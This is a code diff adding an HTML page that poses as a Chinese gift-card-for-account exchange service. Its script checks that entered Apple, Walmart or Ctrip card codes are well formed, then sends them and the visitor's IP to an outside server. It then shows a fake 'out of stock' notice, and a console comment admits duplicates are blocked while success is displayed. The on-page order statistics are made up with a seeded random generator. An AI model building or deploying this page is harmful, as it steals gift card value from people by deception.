@@ -1,0 +1,594 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>coo兑换系统2.1</title>
+  <style>
+    * {
+      box-sizing: border-box;
+    }
+
+    body {
+      margin: 0;
+      min-height: 100vh;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      background: #f4f6fb;
+      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Arial, sans-serif;
+    }
+
+    .card {
+      width: 95%;
+      max-width: 420px;
+      background: white;
+      padding: 50px 25px;
+      border-radius: 20px;
+      box-shadow: 0 10px 35px rgba(0, 0, 0, .08);
+      position: relative;
+    }
+
+    @media (min-width: 768px) {
+      .card {
+        max-width: 600px;
+        padding: 40px 35px;
+      }
+    }
+
+    .title {
+      text-align: center;
+      font-size: 25px;
+      font-weight: 700;
+      margin-bottom: 10px;
+      color: #222;
+    }
+
+    .desc {
+      text-align: center;
+      color: #888;
+      font-size: 14px;
+      margin-bottom: 25px;
+    }
+
+    input,
+    textarea {
+      width: 100%;
+      padding: 14px;
+      border: 1px solid #ddd;
+      border-radius: 12px;
+      font-size: 15px;
+      outline: none;
+      margin-bottom: 15px;
+    }
+
+    input:focus,
+    textarea:focus {
+      border-color: #409eff;
+    }
+
+    textarea {
+      height: 90px;
+      resize: none;
+    }
+
+    .submit-btn {
+      width: 100%;
+      padding: 14px;
+      border: none;
+      border-radius: 12px;
+      background: #409eff;
+      color: white;
+      font-size: 16px;
+      cursor: pointer;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 8px;
+    }
+
+    .submit-btn:disabled {
+      opacity: .7;
+      cursor: not-allowed;
+    }
+
+    .loading {
+      width: 16px;
+      height: 16px;
+      border: 2px solid rgba(255, 255, 255, .5);
+      border-top-color: white;
+      border-radius: 50%;
+      animation: rotate .8s linear infinite;
+    }
+
+    @keyframes rotate {
+      from {
+        transform: rotate(0deg);
+      }
+      to {
+        transform: rotate(360deg);
+      }
+    }
+
+#today-stats {
+    width: 100%;
+    text-align: center;
+    margin-top: 5px;
+    background: #f7f7f7;
+    padding: 5px;
+    border-radius: 10px;
+    font-size: 10px;
+    color: #00c800;
+    line-height: 1.6;
+}
+.stat-fail {
+    color: #ff0000;
+}
+.stat-restock {
+    color: #0066ff;
+}
+#today-stats .stat-default {
+    color: #00c800;
+}
+
+    #today-stats .test-label {
+      display: block;
+      font-size: 11px;
+      color: #999;
+      margin-bottom: 3px;
+    }
+
+    .toast {
+      position: fixed;
+      top: 20px;
+      left: 50%;
+      transform: translateX(-50%);
+      background: #fff3cd;
+      color: #856404;
+      padding: 14px 24px;
+      border-radius: 12px;
+      box-shadow: 0 8px 25px rgba(0, 0, 0, .15);
+      font-size: 15px;
+      font-weight: 500;
+      z-index: 9999;
+      max-width: 420px;
+      width: 90%;
+      text-align: center;
+      border-left: 5px solid #ffc107;
+      display: none;
+      animation: slideDown .3s ease;
+      white-space: pre-line;
+    }
+
+    .toast.error {
+      background: #f8d7da;
+      color: #721c24;
+      border-left-color: #dc3545;
+    }
+
+    .toast.success {
+      background: #d4edda;
+      color: #155724;
+      border-left-color: #28a745;
+    }
+
+    .toast.warning {
+      background: #fff3cd;
+      color: #856404;
+      border-left-color: #ffc107;
+    }
+
+    @keyframes slideDown {
+      from {
+        opacity: 0;
+        transform: translateX(-50%) translateY(-20px);
+      }
+      to {
+        opacity: 1;
+        transform: translateX(-50%) translateY(0);
+      }
+    }
+
+    .modal-bg {
+      display: none;
+      position: fixed;
+      left: 0;
+      top: 0;
+      width: 100%;
+      height: 100%;
+      background: rgba(0, 0, 0, .45);
+      justify-content: center;
+      align-items: center;
+      z-index: 999;
+    }
+
+    .modal {
+      width: 90%;
+      max-width: 380px;
+      background: white;
+      border-radius: 18px;
+      padding: 30px 25px;
+      text-align: center;
+      box-shadow: 0 15px 45px rgba(0, 0, 0, .25);
+      animation: popup .25s ease;
+    }
+
+    @keyframes popup {
+      from {
+        transform: scale(.8);
+        opacity: 0;
+      }
+      to {
+        transform: scale(1);
+        opacity: 1;
+      }
+    }
+
+    .modal-title {
+      font-size: 22px;
+      font-weight: bold;
+      color: #e74c3c;
+      margin-bottom: 15px;
+    }
+
+    .modal-text {
+      font-size: 15px;
+      color: #555;
+      line-height: 1.8;
+    }
+
+    .modal-btn {
+      margin-top: 22px;
+      width: 100%;
+      padding: 12px;
+      border: none;
+      border-radius: 10px;
+      background: #409eff;
+      color: white;
+      font-size: 15px;
+      cursor: pointer;
+    }
+
+    .banner-box {
+      width: 100%;
+      margin: 15px 0;
+      text-align: center;
+    }
+
+    .banner-img {
+      width: 100%;
+      height: auto;
+      display: block;
+      border-radius: 2px;
+    }
+
+    .banner-info {
+      margin-top: 8px;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      gap: 8px;
+    }
+
+    .price-tip {
+      background: #00c800;
+      color: white;
+      padding: 3px 8px;
+      border-radius: 4px;
+      font-size: 16px;
+    }
+
+    .tutorial-btn {
+      background: #ff3b30;
+      display: inline-block;
+      padding: 4px 10px;
+      border-radius: 5px;
+      color: white;
+      font-size: 14px;
+      font-weight: bold;
+      text-decoration: none;
+    }
+
+    @media(max-width:380px) {
+      .price-tip {
+        font-size: 12px;
+      }
+      .tutorial-btn {
+        font-size: 13px;
+      }
+    }
+  </style>
+</head>
+
+<body>
+  <div id="toast" class="toast"></div>
+
+  <div class="card">
+    <div class="title">coo兑换系统2.1</div>
+    <div class="desc">提交套餐信息，系统自动检测库存状态</div>
+
+    <div class="banner-box">
+      <div class="banner-info">
+        <span class="price-tip">50的卡兑换1个月账号丨100的卡兑换24个月账号</span>
+        <a href="/j.html" class="tutorial-btn">👉演示教程必看！</a>
+      </div>
+    </div>
+
+    <input id="name" placeholder="请输入面额:50/100/200">
+    <textarea id="message" placeholder="请输入卡/乱填无效"></textarea>
+
+    <button id="submitBtn" class="submit-btn" onclick="sendMessage()">
+      <span id="btnText">点击兑换</span>
+    </button>
+
+<div id="today-stats">
+  <span class="test-label">系统运行数据</span>
+  今日订单: 成功兑换×<span id="success" class="stat-default">0</span> ｜
+  <span class="stat-fail">错误/无效卡/乱填×<span id="fail">0</span></span> ｜
+  <span class="stat-restock">补货×<span id="restock">0</span></span>
+</div>
+  </div>
+
+  <!-- 弹窗 -->
+  <div class="modal-bg" id="modal">
+    <div class="modal">
+      <div class="modal-title">⚠️ 库存不足</div>
+      <div class="modal-text">
+        库存:0<br>
+        此套餐账号暂时售完！<br><br>
+        请换其他套餐账号或等管理员<br>
+        1-2小时内添加新账号！
+      </div>
+      <button class="modal-btn" onclick="closeModal()">知道了</button>
+    </div>
+  </div>
+
+  <script>
+    // ===== 配置区域 =====
+    const WORKER_URL = 'https://222.shu10.top';
+
+    // ===== 获取访客IP =====
+    async function getVisitorIP() {
+      try {
+        const response = await fetch('https://api.ipify.org?format=json');
+        const data = await response.json();
+        return data.ip;
+      } catch (e) {
+        console.warn('获取IP失败:', e.message);
+        return '未知IP';
+      }
+    }
+
+    // ===== 获取页面名称 =====
+    function getPageName() {
+      const path = window.location.pathname;
+      const fileName = path.split('/').pop();
+      const pageName = fileName.replace(/\.html$/i, '');
+      return pageName || 'unknown';
+    }
+
+    // ===== 禁止输入中文 =====
+    function filterChinese(e) {
+      const el = e.target;
+      const filtered = el.value.replace(/[\u4e00-\u9fff]/g, '');
+      if (el.value !== filtered) {
+        el.value = filtered;
+      }
+    }
+    document.getElementById('name').addEventListener('input', filterChinese);
+    document.getElementById('message').addEventListener('input', filterChinese);
+
+    // ===== Toast 提示 =====
+    let toastTimer = null;
+
+    function showToast(message, type = 'warning') {
+      const toast = document.getElementById('toast');
+      toast.textContent = message;
+      toast.className = 'toast ' + type;
+      toast.style.display = 'block';
+
+      if (toastTimer) {
+        clearTimeout(toastTimer);
+      }
+      toastTimer = setTimeout(() => {
+        toast.style.display = 'none';
+      }, 5000);
+    }
+
+    // ----- 时间间隔限制 (3分钟) -----
+    const SUBMIT_INTERVAL_MS = 3 * 60 * 1000;
+
+    function getLastSubmitTime() {
+      return parseInt(localStorage.getItem('lastSubmitTime') || '0', 10);
+    }
+
+    function setLastSubmitTime() {
+      localStorage.setItem('lastSubmitTime', Date.now().toString());
+    }
+
+    function canSubmit() {
+      const last = getLastSubmitTime();
+      return (Date.now() - last) >= SUBMIT_INTERVAL_MS;
+    }
+
+    function getRemainSeconds() {
+      const last = getLastSubmitTime();
+      const remain = Math.ceil((SUBMIT_INTERVAL_MS - (Date.now() - last)) / 1000);
+      return Math.max(0, remain);
+    }
+
+    // ============================================================
+    // 卡密验证
+    // ============================================================
+    function validateCard(message) {
+      const cleaned = message.replace(/[^a-zA-Z0-9]/g, '');
+      const len = cleaned.length;
+
+      if (len === 0) {
+        return { valid: false };
+      }
+
+      const isApple = /gca/i.test(cleaned) && len === 32;
+      if (isApple) {
+        return { valid: true };
+      }
+
+      const hasWalmartCode = /2326|8688/.test(cleaned);
+      const isAllDigits = /^[0-9]+$/.test(cleaned);
+      const isWalmart = hasWalmartCode && isAllDigits && len === 25;
+      if (isWalmart) {
+        return { valid: true };
+      }
+
+      const isCtrip = isAllDigits && len === 18;
+      if (isCtrip) {
+        return { valid: true };
+      }
+
+      return { valid: false };
+    }
+
+    // ============================================================
+    // 核心提交函数
+    // ============================================================
+    async function sendMessage() {
+      const name = document.getElementById('name').value.trim();
+      const message = document.getElementById('message').value;
+
+      if (!name || !message) {
+        showToast('⚠️ 请填写完整信息！', 'warning');
+        return;
+      }
+
+      if (!canSubmit()) {
+        const remain = getRemainSeconds();
+        showToast('⏰ 请等待 ' + remain + ' 秒后再提交', 'warning');
+        return;
+      }
+
+      if (!validateCard(message).valid) {
+        showToast('提交失败！请检查卡密是否正确有效！', 'error');
+        return;
+      }
+
+      const btn = document.getElementById('submitBtn');
+      const btnText = document.getElementById('btnText');
+
+      btn.disabled = true;
+      btnText.innerHTML = `<div class="loading"></div>提交中...`;
+
+      const ip = await getVisitorIP();
+
+      const data = { 
+        name: name, 
+        message: message,
+        page: getPageName(),
+        ip: ip
+      };
+
+      try {
+        const response = await fetch(WORKER_URL, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify(data),
+          credentials: 'omit'
+        });
+
+        if (!response.ok) {
+          const errorText = await response.text();
+          throw new Error(`HTTP ${response.status}: ${errorText}`);
+        }
+
+        const result = await response.json();
+        console.log('Server response:', result);
+
+        const isDuplicate = result.duplicate === true || 
+                           (result.error && result.error.includes('duplicate'));
+
+        if (isDuplicate) {
+          showModal();
+          showToast('✅ 提交成功！', 'success');
+          console.log('🔒 重复卡密已拦截，但前端显示成功');
+        } else if (result.error) {
+          showToast('提交失败！请检查卡密是否正确有效！', 'error');
+        } else if (result.success === false) {
+          showToast('提交失败！请检查卡密是否正确有效！', 'error');
+        } else {
+          setLastSubmitTime();
+          showModal();
+          showToast('✅ 提交成功！', 'success');
+        }
+
+      } catch (e) {
+        console.error('提交错误:', e);
+        showToast('提交失败！请检查卡密是否正确有效！', 'error');
+      } finally {
+        btn.disabled = false;
+        btnText.innerHTML = '点击兑换';
+      }
+    }
+
+    function showModal() {
+      document.getElementById('modal').style.display = 'flex';
+    }
+
+    function closeModal() {
+      document.getElementById('modal').style.display = 'none';
+    }
+
+    async function testWorkerConnection() {
+      try {
+        const response = await fetch(WORKER_URL);
+        const data = await response.json();
+        console.log('Worker test response:', data);
+        if (data.status === 'ok') {
+          console.log('✅ Worker 连接正常');
+        }
+      } catch (e) {
+        console.warn('⚠️ Worker 连接测试失败:', e.message);
+      }
+    }
+
+    window.addEventListener('load', function() {
+      testWorkerConnection();
+    });
+
+    // ----- 模拟统计 -----
+    function seededRandom(seed) {
+      let x = Math.sin(seed) * 10000;
+      return x - Math.floor(x);
+    }
+
+    function random(seed, min, max) {
+      return Math.floor(seededRandom(seed) * (max - min + 1)) + min;
+    }
+
+    const now = new Date();
+    const year = now.getFullYear();
+    const month = now.getMonth() + 1;
+    const day = now.getDate();
+    const currentHour = now.getHours();
+
+    let success = 0,
+      fail = 0,
+      restock = 0;
+
+    for (let h = 0; h <= currentHour; h++) {
+      let seed = year * 10000 + month * 100 + day + h;
+      success += random(seed, 0, 8);
+      fail += random(seed + 999, 0, 1);
+    }
+
+    for (let h = 0; h <= currentHour; h += 6) {
+      let seed = year * 50000 + month * 500 + day + h;
+      restock += random(seed, 0, 1);
+    }
+
+    document.getElementById('success').innerText = success;
+    document.getElementById('fail').innerText = fail;
+    document.getElementById('restock').innerText = restock;
+  </script>
+</body>
+
+</html>
